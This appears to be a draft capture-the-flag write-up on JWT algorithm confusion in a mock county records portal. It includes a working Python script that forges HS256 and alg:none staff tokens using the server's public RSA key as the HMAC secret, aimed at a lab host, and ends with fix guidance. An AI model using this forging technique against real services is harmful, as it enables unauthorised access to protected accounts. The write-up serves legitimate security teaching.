---
title: "The Archive Request: Signing Your Own Staff Badge"
date: 2026-10-16
draft: true
description: "A county records portal verifies staff tokens with a JWT library that trusts the algorithm named in the header. It also serves the RSA public key at a predictable path. Put those two facts together and you can sign your own admin token."
tags: ["CTF", "Web Exploitation", "JWT", "Algorithm Confusion", "Authentication Bypass"]
categories: ["Web"]
authors: ["z3ro"]
---

<div class="dr-hero">
  <div class="dr-hero-top">
    <span class="dr-badge">Web</span>
    <span class="dr-badge cyan">Easy</span>
    <span class="dr-badge cyan">150 pts</span>
    <span class="dr-badge ghost">r00t CTF · The Archive Request</span>
  </div>
  <div class="dr-title">THE ARCHIVE REQUEST</div>
  <p class="dr-sub">The Riverside County Records Archive lets residents file public-records requests and track them by number, and it keeps an internal <strong>priority queue</strong> behind a staff login. The staff token is a JWT. The key that "verifies" it is served publicly, and the server is happy to take your word for which algorithm it should use.</p>
</div>

<div class="dr-stats">
  <div class="dr-stat"><span class="n red">1</span><span class="l">header field trusted</span></div>
  <div class="dr-stat"><span class="n cyan">2048</span><span class="l">bit public key</span></div>
  <div class="dr-stat"><span class="n">0</span><span class="l">secrets needed</span></div>
  <div class="dr-stat"><span class="n">staff</span><span class="l">queue reached</span></div>
</div>

## The setup

The public side of the app is ordinary: you can file a request and then read it back at `/requests/<id>`. Walking the IDs shows a few pre-seeded records, which is where the interesting strings tend to hide.

The staff side is a single route, `/admin/queue`, guarded by a cookie:

```
Cookie: staff_token=<jwt>
```

And sitting in the static directory, world-readable, is a file the app uses to *check* those tokens:

```
GET /static/pubkey.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnYLf0AjrPu1qNvFWuWu/
EbXzZT2CCf00qdUULuMoxQdLwvF7cvky8rAmUEFJsbzdicQS0sIMyA03ZfiWFj92
...
0wIDAQAB
-----END PUBLIC KEY-----
```

A 2048-bit RSA **public** key. Public keys are not secrets — that is the point of them. The bug is not that it is exposed. The bug is *how the server uses it.*

![The Archive Request chain: a public key, a trusted alg header, and a forged staff token](/public/images/archive-request/00_chain.svg)

## The flaw: the header picks the algorithm

A well-formed JWT has three parts — `header.payload.signature` — and the header names the signing algorithm:

```json
{ "alg": "RS256", "typ": "JWT" }
```

`RS256` means "RSA signature, verified with the RSA public key". That is the intended design: the private key signs, the public key verifies.

The vulnerability shows up when the server reads `alg` **from the token's own header** and then hands the library both the algorithm and a key, without checking that the two belong together. If the server does something equivalent to:

```python
jwt.decode(token, key=open("pubkey.pem","rb").read(), algorithms=["RS256","HS256"])
```

then an attacker can send `"alg": "HS256"` and have the server verify an **HMAC-SHA256** signature — using the RSA public key *bytes* as the HMAC secret. The public key is public, so the attacker knows the exact secret. Sign your own token and it verifies cleanly.

<div class="dr-callout danger">
  <span class="t">Key confusion in one sentence</span>
  <p>The server has one key object and two meanings for it. It treats the <strong>public</strong> key as a verification key when the token says RS256, and as a shared <strong>secret</strong> when the token says HS256. Same bytes; completely different trust model.</p>
</div>

## Forging the token

No library needed. The public key is fetched, then an HS256 token is built by hand, using the raw PEM bytes as the HMAC key. The payload names a staff role.

```python
#!/usr/bin/env python3
import base64, hmac, hashlib, json, urllib.request, urllib.error

BASE = "http://the-archive-request-8264.labs.perfectroot.io"
PEM  = urllib.request.urlopen(BASE + "/static/pubkey.pem", timeout=20).read()

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

def make_jwt(payload, key, alg="HS256"):
    h = b64u(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = h + b"." + p
    if alg == "none":
        return (signing_input + b".").decode()
    sig = b64u(hmac.new(key, signing_input, hashlib.sha256).digest())
    return (signing_input + b"." + sig).decode()

def try_token(tok):
    req = urllib.request.Request(BASE + "/admin/queue")
    req.add_header("Cookie", "staff_token=" + tok)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as ex:
        return ex.code, ex.read().decode("utf-8", "replace")
```

The one detail that trips people up is the **exact key bytes**. If the server read the file verbatim, the trailing newline is part of the key. A token signed with `PEM.rstrip(b"\n")` will fail even though the idea is right. So the exploit tries both, along with a few plausible payload shapes:

```python
payloads = [
    {"role": "staff"}, {"role": "admin"},
    {"user": "staff", "role": "staff"},
    {"username": "staff", "role": "staff"},
    {"sub": "staff", "role": "staff"},
    {"sub": "staff"}, {"is_staff": True},
]

for key in (PEM, PEM.rstrip(b"\n")):
    for pl in payloads:
        code, body = try_token(make_jwt(pl, key))
        if code == 200 and "Staff Login" not in body:
            print(code, pl, "*** ACCESS ***")
            print(body)
            raise SystemExit
```

The `alg: "none"` variant — a token with an empty signature and `"alg":"none"` — is attempted too, in case the library honours it. Here it is the HMAC path that lands.

<div class="dr-callout warn">
  <span class="t">Flag captured on the live instance</span>
  <p>The queue page returned the flag when this ran against the box. The instance is down now, so the exact queue contents are omitted — paste the real flag into the banner when you publish.</p>
</div>

<div class="dr-flag">
  <span class="l">Flag</span>
  <code>r00t{&hellip;}</code>
</div>

## Root cause notes

This is the classic JWT **algorithm confusion** (a.k.a. key confusion) bug, and the fix is a one-liner.

- **Pin the algorithm server-side.** Verify with an explicit, single expected algorithm: `jwt.decode(token, key, algorithms=["RS256"])`. Never let `alg` from the header widen what the server will accept.
- **Never mix key types.** A verification key for an asymmetric algorithm must not be usable as an HMAC secret. Different algorithms should get different, typed key material.
- **`alg: none` is not a signature.** Libraries have shipped "none" mode for unsecured tokens; a verifier must refuse it explicitly unless the whole deployment is intentionally unauthenticated.
- **Public keys are public — that's fine.** Exposing `pubkey.pem` is normal and useful. The exposure is a red herring; the danger is entirely in the verification path.
